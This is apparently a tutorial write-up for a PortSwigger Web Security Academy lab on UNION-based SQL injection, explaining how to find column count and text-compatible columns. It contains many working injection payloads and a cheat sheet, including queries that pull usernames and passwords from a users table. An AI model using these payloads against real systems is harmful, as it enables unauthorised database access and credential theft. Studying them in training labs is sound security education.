# SQL Injection UNION Attack: Finding a Column Containing Text

> **Lab 4 — PortSwigger Web Security Academy**  
> A comprehensive deep-dive into identifying string-compatible columns for UNION-based SQL injection.

---

## Table of Contents

- [Overview](#overview)
- [The Two UNION Rules](#the-two-union-rules)
- [Why NULL First, Then 'a'?](#why-null-first-then-a)
- [What Happens Under the Hood](#what-happens-under-the-hood)
- [Database-Specific Nuances](#database-specific-nuances)
- [Step-by-Step Attack Chain](#step-by-step-attack-chain)
- [Edge Cases & Pro Tips](#edge-cases--pro-tips)
- [How This Fits the Bigger Picture](#how-this-fits-the-bigger-picture)
- [Payload Cheat Sheet](#payload-cheat-sheet)
- [References](#references)

---

## Overview

A `UNION`-based SQL injection attack merges the result set of the original query with a second, attacker-controlled `SELECT` statement. For this to work, two strict prerequisites must be satisfied:

1. **Column count match** — The injected `SELECT` must return the same number of columns as the original query.
2. **Type compatibility** — Each column in the injected `SELECT` must be type-compatible with the corresponding column in the original query.

**Lab 3** covers finding the column count. **This lab (Lab 4)** focuses on satisfying the second rule: determining which columns can hold **string data** so you can later exfiltrate meaningful information (usernames, passwords, tokens, etc.).

---

## The Two UNION Rules

| Rule | Requirement | Consequence of Violation |
|------|-------------|--------------------------|
| **1. Same column count** | `SELECT` lists must have equal length | Database error: *"The used SELECT statements have a different number of columns"* |
| **2. Compatible data types** | Corresponding columns must share compatible types | Database error: *"Expression must have same datatype as corresponding expression"* |

> **Key Insight:** You cannot retrieve a string like `'abcdef'` from a column that the database expects to be numeric. The database will reject the query.

---

## Why NULL First, Then 'a'?

### The NULL Trick

`NULL` is **type-agnostic**. It can represent a missing value of *any* data type — integer, string, date, boolean, blob. This makes it the perfect placeholder when you only care about matching the **number** of columns, not their types.

```sql
' UNION SELECT NULL,NULL,NULL--
```

If the original query returns 3 columns, this works regardless of whether those columns are `INT`, `VARCHAR`, or `DATE`. The database sees three values and three slots, and it's happy.

### The String Probe

Once you know the column count, you need to find which slot can hold a string. You replace one `NULL` at a time with a string literal:

```sql
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--
' UNION SELECT NULL,NULL,'a'--
```

If a column in the original query is defined as `INT`, the database tries to reconcile `'a'` (a `VARCHAR`) with an `INT` slot. On **strictly typed databases** (Oracle, PostgreSQL), this throws an explicit type-conversion error. On **lenient databases** (MySQL with implicit casting), it might coerce the string to `0` and not error — which is why you always verify by checking if the string actually appears in the response.

---

## What Happens Under the Hood

Imagine the original (vulnerable) query looks like this:

```sql
SELECT name, price, description FROM products WHERE category = 'Pets'
```

When you inject:

```sql
Pets' UNION SELECT NULL,'a',NULL--
```

The server constructs:

```sql
SELECT name, price, description FROM products WHERE category = 'Pets'
UNION
SELECT NULL, 'a', NULL
```

| Original Query | Injected Query | Type Match? |
|----------------|----------------|-------------|
| `name` (string) | `NULL` | ✅ Compatible |
| `price` (numeric) | `'a'` (string) | ❌ Mismatch → Error |
| `description` (string) | `NULL` | ✅ Compatible |

If `price` is numeric, the database sees a type mismatch and errors. You then try:

```sql
Pets' UNION SELECT NULL,NULL,'a'--
```

Now `'a'` lands in the `description` slot (string), and the query succeeds. You've found your string-compatible column.

---

## Database-Specific Nuances

| Database | Behavior with String in Numeric Column | Notes |
|----------|----------------------------------------|-------|
| **MySQL** | Often silent — implicitly casts string to `0` | You must **visually confirm** the string appears in the response; don't rely solely on errors |
| **PostgreSQL** | Strict. Throws `ERROR: invalid input syntax for integer` | Very reliable for this technique |
| **Oracle** | Strict. Throws `ORA-01790: expression must have same datatype as corresponding expression` | Reliable. Requires `FROM DUAL` in some contexts |
| **Microsoft SQL Server** | Throws `Conversion failed when converting the varchar value...` | Reliable |

> **Critical:** MySQL's lenient casting means **absence of error ≠ success**. Always verify the string appears in the rendered page.

---

## Step-by-Step Attack Chain

### Step 1: Confirm the Injection Point

Click a category filter. Intercept the request. Append a single quote:

```sql
Pets'
```

If you get a `500 Internal Server Error` or a SQL syntax error, you've confirmed the injection point. The application is concatenating your input directly into the query.

### Step 2: Determine Column Count

**Method A: `ORDER BY`**

```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
' ORDER BY 4--   <-- Error here means 3 columns
```

**Method B: `UNION SELECT NULL`** (More reliable)

```sql
' UNION SELECT NULL--              -- Error
' UNION SELECT NULL,NULL--         -- Error
' UNION SELECT NULL,NULL,NULL--    -- 200 OK = 3 columns
```

### Step 3: Probe for String Compatibility

The lab gives you a random string (e.g., `Zi4rv2`). Test one column at a time:

```sql
' UNION SELECT 'Zi4rv2',NULL,NULL--
' UNION SELECT NULL,'Zi4rv2',NULL--
' UNION SELECT NULL,NULL,'Zi4rv2'--
```

Watch for:
- **HTTP 500** → Type mismatch, this column is not string-compatible
- **HTTP 200 + string visible in response** → Bingo. This column can hold text

### Step 4: Solve the Lab

Once you identify the string-compatible column (say, column 2), the final payload is:

```sql
' UNION SELECT NULL,'abcdef',NULL--
```

The lab verifies that `'abcdef'` appears in the query results.

---

## Edge Cases & Pro Tips

### URL Encoding

In Burp Suite Repeater, always URL-encode your payload:

```
Raw:     ' UNION SELECT NULL,'a',NULL--
Encoded: %27+UNION+SELECT+NULL,%27a%27,NULL--%20
```

### Comment Variations

| Database | Comment Style |
|----------|---------------|
| MySQL, PostgreSQL, SQL Server | `-- ` (note the trailing space) or `/* ... */` |
| Oracle | `-- ` or `/* ... */` |

If `--` fails, try `--+` (the `+` becomes a space after URL decoding) or `#` (MySQL).

### Oracle's `FROM DUAL`

If you suspect Oracle and your `UNION SELECT NULL` payloads are erroring even with the right column count, Oracle requires a table name. Use:

```sql
' UNION SELECT NULL,NULL FROM DUAL--
```

### Multiple String Columns

If the original query returns multiple string-compatible columns, you can exfiltrate multiple fields at once:

```sql
' UNION SELECT username, password FROM users--
```

If only one column is string-compatible, you'll need concatenation (covered in the next lab):

```sql
-- Oracle
' UNION SELECT NULL, username||'~'||password FROM users--

-- MySQL
' UNION SELECT NULL, CONCAT(username,'~',password) FROM users--
```

### Why Not Just Guess?

You might wonder: *"Can't I just look at the page and see what's displayed?"*

Sometimes, yes. But:
- **Not all columns are displayed.** The original query might select 5 columns, but the application only renders 2. The hidden columns still exist and must be accounted for.
- **Type inference from rendered data is unreliable.** A price might be stored as `VARCHAR` in the database and only *displayed* as a number.
- **You need certainty.** One wrong assumption and your entire exfiltration chain breaks.

The systematic `NULL` → `'a'` approach removes guesswork.

---

## How This Fits the Bigger Picture

This lab is part of a progression:

| Lab | Skill Learned | Why It Matters |
|-----|---------------|----------------|
| Lab 3 | Find column count | Satisfies UNION Rule 1 |
| **Lab 4** | **Find string column** | **Satisfies UNION Rule 2** |
| Lab 5 | Retrieve data from other tables | Uses both rules to dump data |
| Lab 6 | Retrieve multiple values in one column | Handles the "only one string column" case |
| Lab 7+ | Examine database structure | Find table/column names without guessing |

Mastering Lab 4 is non-negotiable. Every subsequent UNION attack depends on knowing exactly where your string data can land.

---

## Payload Cheat Sheet

### Column Count Discovery

```sql
-- ORDER BY method
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--

-- UNION NULL method
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

### String Compatibility Test

```sql
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--
' UNION SELECT NULL,NULL,'a'--
```

### Final Payload (Example: string in column 2)

```sql
' UNION SELECT NULL,'abcdef',NULL--
```

### Oracle Variants

```sql
' UNION SELECT NULL FROM DUAL--
' UNION SELECT NULL,NULL FROM DUAL--
' UNION SELECT 'a',NULL FROM DUAL--
' UNION SELECT NULL,'abcdef' FROM DUAL--
```

---

## Key Takeaways

1. **`NULL` is type-agnostic** — use it to discover column count without worrying about data types.
2. **Test each column individually** with a string literal (`'a'`) to find string-compatible slots.
3. **MySQL is lenient** — it may not error on type mismatches. Always verify by sight.
4. **Oracle requires `FROM DUAL`** — don't forget the table reference.
5. **This is a prerequisite** — you cannot exfiltrate meaningful data without knowing which column can hold strings.

---

## References

- [PortSwigger Web Security Academy — SQL Injection](https://portswigger.net/web-security/sql-injection)
- [PortSwigger Lab: SQL injection UNION attack, finding a column containing text](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text)
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [SQL Injection Cheat Sheet — Netsparker](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/)

---

> **Author:** Security Researcher  
> **Date:** 2026-09-03  
> **License:** MIT — Free to use, modify, and distribute with attribution.
